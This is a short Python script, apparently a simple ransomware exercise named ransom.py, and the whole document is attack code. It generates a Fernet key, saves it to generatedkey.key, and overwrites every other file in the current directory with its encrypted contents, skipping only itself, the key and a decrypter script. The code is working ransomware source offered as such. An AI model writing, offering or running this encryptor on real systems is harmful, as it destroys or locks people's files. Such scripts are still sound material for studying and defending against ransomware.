#!/usr/bin/env/ python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
		continue #do not encrypt the current file we are working with or the key
	if os.path.isfile(file):
		files.append(file) #do not add if this is a directory, only if a file

print(files)

key = Fernet.generate_key()

print(key)

with open("generatedkey.key","wb") as generatedkey:
	generatedkey.write(key)

for file in files:
	with open(file,"rb") as the_file:
		contents = the_file.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as the_file:
		the_file.write(contents_encrypted)